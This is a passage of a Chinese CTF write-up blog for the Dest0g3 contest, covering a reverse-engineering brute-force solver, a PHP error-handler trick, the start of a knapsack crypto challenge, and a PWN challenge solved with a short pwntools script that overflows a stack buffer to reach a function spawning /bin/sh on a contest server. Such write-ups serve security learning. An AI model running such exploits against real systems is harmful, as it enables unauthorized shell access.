str[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+A8h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  *(_QWORD *)str = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">8</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">16</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">24</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">32</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">40</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">48</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">56</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">64</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">72</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">80</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">88</span>] = <span class="hljs-number">0LL</span>;<br>  *(_DWORD *)&amp;str[<span class="hljs-number">96</span>] = <span class="hljs-number">0</span>;<br>  *(_QWORD *)enc = <span class="hljs-number">0x9F8E7A1CC6486497</span>LL;<br>  *(_QWORD *)&amp;enc[<span class="hljs-number">8</span>] = <span class="hljs-number">0x69EEF382E760BD46</span>LL;<br>  *(_QWORD *)&amp;enc[<span class="hljs-number">16</span>] = <span class="hljs-number">0xB9C017E2E30EF749</span>LL;<br>  *(_QWORD *)&amp;enc[<span class="hljs-number">24</span>] = <span class="hljs-number">0x98410148A430392C</span>LL;<br>  *(_QWORD *)&amp;enc[<span class="hljs-number">32</span>] = <span class="hljs-number">0xE80E7411E5B5A939</span>LL;<br>  *(_DWORD *)&amp;enc[<span class="hljs-number">40</span>] = <span class="hljs-number">-1517552212</span>;<br>  enc[<span class="hljs-number">44</span>] = <span class="hljs-number">109</span>;<br>  fwrite(<span class="hljs-string">&quot;input: &quot;</span>, <span class="hljs-number">1uLL</span>, <span class="hljs-number">7uLL</span>, <span class="hljs-built_in">stdout</span>);<br>  fgets(str, <span class="hljs-number">46</span>, <span class="hljs-built_in">stdin</span>);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(str) != <span class="hljs-number">45</span> )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">44</span>; ++i )<br>  &#123;<br>    v1 = <span class="hljs-number">23</span> * str[i];<br>    <span class="hljs-keyword">if</span> ( ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[i]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) + (_BYTE)v1 + x[i] - ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[i]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) != enc[i] )<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;good!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>这里的数据初始化一部分放在了代码里面，对于enc变量，我们可以运行程序然后从内存里dump出来。这里面又是DWORD又是BYTE又是QWORD，还有负数在里面，自己写很有可能出问题，所以选择从内存中dump。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7fffffffdf10</span>: <span class="hljs-number">0</span>x97    <span class="hljs-number">0</span>x64    <span class="hljs-number">0</span>x48    <span class="hljs-number">0</span>xc6    <span class="hljs-number">0</span>x1c    <span class="hljs-number">0</span>x7a    <span class="hljs-number">0</span>x8e    <span class="hljs-number">0</span>x9f<br><span class="hljs-attribute">0x7fffffffdf18</span>: <span class="hljs-number">0</span>x46    <span class="hljs-number">0</span>xbd    <span class="hljs-number">0</span>x60    <span class="hljs-number">0</span>xe7    <span class="hljs-number">0</span>x82    <span class="hljs-number">0</span>xf3    <span class="hljs-number">0</span>xee    <span class="hljs-number">0</span>x69<br><span class="hljs-attribute">0x7fffffffdf20</span>: <span class="hljs-number">0</span>x49    <span class="hljs-number">0</span>xf7    <span class="hljs-number">0</span>x0e    <span class="hljs-number">0</span>xe3    <span class="hljs-number">0</span>xe2    <span class="hljs-number">0</span>x17    <span class="hljs-number">0</span>xc0    <span class="hljs-number">0</span>xb9<br><span class="hljs-attribute">0x7fffffffdf28</span>: <span class="hljs-number">0</span>x2c    <span class="hljs-number">0</span>x39    <span class="hljs-number">0</span>x30    <span class="hljs-number">0</span>xa4    <span class="hljs-number">0</span>x48    <span class="hljs-number">0</span>x01    <span class="hljs-number">0</span>x41    <span class="hljs-number">0</span>x98<br><span class="hljs-attribute">0x7fffffffdf30</span>: <span class="hljs-number">0</span>x39    <span class="hljs-number">0</span>xa9    <span class="hljs-number">0</span>xb5    <span class="hljs-number">0</span>xe5    <span class="hljs-number">0</span>x11    <span class="hljs-number">0</span>x74    <span class="hljs-number">0</span>x0e    <span class="hljs-number">0</span>xe8<br><span class="hljs-attribute">0x7fffffffdf38</span>: <span class="hljs-number">0</span>xac    <span class="hljs-number">0</span>xfd    <span class="hljs-number">0</span>x8b    <span class="hljs-number">0</span>xa5    <span class="hljs-number">0</span>x6d <br></code></pre></td></tr></table></figure>
<p>x直接就在文件里面，直接找出来就行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[i]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) + (_BYTE)v1 + x[i] - ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[i]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) != enc[i] )<br></code></pre></td></tr></table></figure>
<p>这里有一个BYTE转换，实际上v1是int类型的，这就丢数据了。我们逆向过程不太能解。由于这个题目数据前后没有关联性，所以可以采用爆破的方式，复杂度为O(n)，是可以爆破的，也就字符集*45的大小。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windef.h&gt;</span></span><br><br><span class="hljs-type">char</span> x[] = &#123;<span class="hljs-number">0x7b</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x9e</span>,<br>            <span class="hljs-number">0x58</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x2c</span>,<br>            <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xb1</span>,<br>            <span class="hljs-number">0x73</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x3c</span>,<br>            <span class="hljs-number">0</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x32</span>&#125;;<br><br>BYTE enc[] = &#123;<span class="hljs-number">0x97</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x9f</span>,<br>              <span class="hljs-number">0x46</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x69</span>,<br>              <span class="hljs-number">0x49</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xb9</span>,<br>              <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x98</span>,<br>              <span class="hljs-number">0x39</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xe8</span>,<br>              <span class="hljs-number">0xac</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x6d</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">45</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0x20</span>; i &lt;= <span class="hljs-number">0x7e</span>; i++) &#123;<br>            <span class="hljs-type">int</span> v1 = <span class="hljs-number">23</span>*i;<br>            <span class="hljs-keyword">if</span> ( ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[index]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) + (BYTE)v1 + x[index] - ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[index]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) == enc[index] )&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, i);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        index ++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// Dest0g3f82cd79-da3-04-aa0a5b3e445c&#125;</span><br></code></pre></td></tr></table></figure>
<p>其实那个左移31+24位可以直接去掉了，unsigned int也是4字节的，4字节一共才32位，所以前面和后面的那两个位移就是0，可以去掉。</p>
<p>嗯…但是跑出来的结果好像不太对，少了一部分的数据。看起来是数据类型的问题。主要是这个char他的正负有点难搞。最后统一了一下判断的格式。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windef.h&gt;</span></span><br><br>BYTE x[] = &#123;<span class="hljs-number">0x7b</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x92</span>,<br>            <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x4a</span>,<br>            <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xb1</span>,<br>            <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x8d</span>,<br>            <span class="hljs-number">0x82</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x3c</span>,<br>            <span class="hljs-number">0</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x32</span>&#125;;<br><br>BYTE enc[] = &#123;<span class="hljs-number">0x97</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x9f</span>,<br>              <span class="hljs-number">0x46</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x69</span>,<br>              <span class="hljs-number">0x49</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xb9</span>,<br>              <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x98</span>,<br>              <span class="hljs-number">0x39</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xe8</span>,<br>              <span class="hljs-number">0xac</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x6d</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">45</span>)<br>    &#123;<br>        <span class="hljs-type">int</span> i;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0x0</span>; i &lt;= <span class="hljs-number">0xff</span>; i++)<br>        &#123;<br>            <span class="hljs-type">int</span> v1 = <span class="hljs-number">23</span> * i;<br>            <span class="hljs-keyword">if</span> ((<span class="hljs-type">char</span>)((BYTE)v1 + x[index]) == (<span class="hljs-type">char</span>)(enc[index]))<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, i);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        index++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// Dest0g3&#123;f982cd79-d7a3-0874-aa0b-a5b37e4445c8&#125;</span><br></code></pre></td></tr></table></figure>
<h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1>
<h2 id="ez_arrch"><a class="markdownIt-Anchor" href="#ez_arrch"></a> ez_arrch</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sub_968</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [xsp+10h] [xbp+10h] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please leave your name:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x30</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK, you can exploit it now.&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>反汇编能看到这个函数，这里就存在一个栈溢出。接下来就是看看用什么溢出的方式了。</p>
<p>翻二进制数据的时候发现了一个“/bin/sh”的字符串，加上程序提供了system这个函数，所以想通过这个方式来进行溢出。</p>
<p>当我跟随这个字符串的时候，发现他是在另外一个函数里面的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">000000000000093</span>C ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">000000000000093</span>C ; __unwind &#123;<br>.text:<span class="hljs-number">000000000000093</span>C                 STP             X29, X30, [SP,#<span class="hljs-number">-0x10</span>]!<br>.text:<span class="hljs-number">0000000000000940</span>                 MOV             X29, SP<br>.text:<span class="hljs-number">0000000000000944</span>                 ADRL            X0, aOkYouGetIt ; <span class="hljs-string">&quot;OK, you get it !&quot;</span><br>.text:<span class="hljs-number">000000000000094</span>C                 BL              .<span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">0000000000000950</span>                 ADRL            X0, aBinSh ; <span class="hljs-string">&quot;/bin/sh&quot;</span><br>.text:<span class="hljs-number">0000000000000958</span>                 BL              .system<br>.text:<span class="hljs-number">000000000000095</span>C                 NOP<br>.text:<span class="hljs-number">0000000000000960</span>                 LDP             X29, X30, [SP],#<span class="hljs-number">0x10</span><br>.text:<span class="hljs-number">0000000000000964</span>                 RET<br>.text:<span class="hljs-number">0000000000000964</span> ; &#125; <span class="hljs-comment">// starts at 93C</span><br></code></pre></td></tr></table></figure>
<p>那么我们直接跳这个函数就行了，不需要再用system+参数了。而且我看了看system的地址好像也挺奇怪的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pwn<br>r = pwn.remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28099</span>)<br>func_addr = <span class="hljs-number">0x4000000000</span> + <span class="hljs-number">0x93c</span><br>r.send(pwn.p64(func_addr)*<span class="hljs-number">10</span>)<br>r.interactive()<br><br><span class="hljs-comment"># Dest0g3&#123;e5df9fec-e7cb-4f27-9c49-62f1d260395d&#125;</span><br></code></pre></td></tr></table></figure>
<h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1>
<h2 id="phpdest"><a class="markdownIt-Anchor" href="#phpdest"></a> phpdest</h2>
<p>这题网上直接有解，由于我本身对Web不太熟悉，这里我只是运气好碰上了。</p>
<p>这里给出地址：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fmyyy1/article/details/117256082">https://blog.csdn.net/fmyyy1/article/details/117256082</a></p>
<h2 id="easyphp"><a class="markdownIt-Anchor" href="#easyphp"></a> EasyPHP</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;fl4g.php&quot;</span>;<br><span class="hljs-variable">$dest0g3</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;H&quot;</span>);<br><span class="hljs-variable">$timme</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;d&quot;</span>);<br><span class="hljs-variable">$timmme</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;i&quot;</span>);<br><span class="hljs-keyword">if</span>((<span class="hljs-variable">$time</span> &gt; <span class="hljs-string">&quot;24&quot;</span>) <span class="hljs-keyword">or</span> (<span class="hljs-variable">$timme</span> &gt; <span class="hljs-string">&quot;31&quot;</span>) <span class="hljs-keyword">or</span> (<span class="hljs-variable">$timmme</span> &gt; <span class="hljs-string">&quot;60&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$fl4g</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try harder!&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">set_error_handler</span>(<br>    function() <span class="hljs-keyword">use</span>(&amp;$<span class="hljs-title">fl4g</span>) &#123;<br>        <span class="hljs-title">print</span> $<span class="hljs-title">fl4g</span>;<br>    &#125;<br>);<br><span class="hljs-variable">$fl4g</span> .= <span class="hljs-variable">$dest0g3</span>;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
<p>主要就是要来触发这个set_error_handler，所以上传一个语法错误就行了。这里传的是一个数组。</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"># Dest0g3&#123;aa4f0051<span class="hljs-string">-414</span>d<span class="hljs-string">-46</span>bf-ab12<span class="hljs-string">-599</span>c5596c8e4&#125;<br></code></pre></td></tr></table></figure>
<h1 id="未完成"><a class="markdownIt-Anchor" href="#未完成"></a> 未完成</h1>
<h2 id="bag"><a class="markdownIt-Anchor" href="#bag"></a> Bag</h2>
<p>由于源程序中的数据占了很大一部分，这里的代码我自己进行了修改，把数据采用生成的方式来表示了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>message = bytes_to_long(flag[<span class="hljs-number">8</span>:-<span class="hljs-number">1</span>])<br>Baglenth=<span class="hljs-number">286</span><br><span class="hljs-comment"># 下面的代码经过了修改</span><br>Bag=[<span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(Bag) &lt;= Baglenth:<br>    Bag.append(Bag[-<span class="hljs-number">1</span>]*<span class="hljs-number">2</span>)<br><br>Bag=Bag[::-<span class="hljs-number">1</span>]<br>m=<span class="hljs-number">372992427307339981616536686110115630075342113098010788080347982669869622759400031649792</span><br>w=<span class="hljs-number">274062421102700155372289583695782343443</span><br><span class="hljs-keyword">assert</span> gmpy2.gcd(m,w)==<span class="hljs-number">1</span><br>h=<span class="hljs-number">0</span><br>j=<span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> m.bit_length()%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>    h=m.bit_length()<br>    j=<span class="hljs-built_in">int</span>(h//<span class="hljs-number">2</span>)<br><span class="hljs-keyword">else</span>:<br>    h=m.bit_length()<br>    j=<span class="hljs-built_in">int</span>(h//<span class="hljs-number">2</span>+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">m,lenth</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(m)&lt;lenth:<br>        m=<span class="hljs-string">&#x27;0&#x27;</span>+m<br>    <span class="hljs-keyword">return</span> m<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">keygen</span>():<br>    pk=[]<br>    sk=[]<br>    sk.append(m)<br>    sk.append(<span class="hljs-built_in">int</span>(gmpy2.invert(w,m)))<br>    D=[]<br>    binD=[]<br>    <span 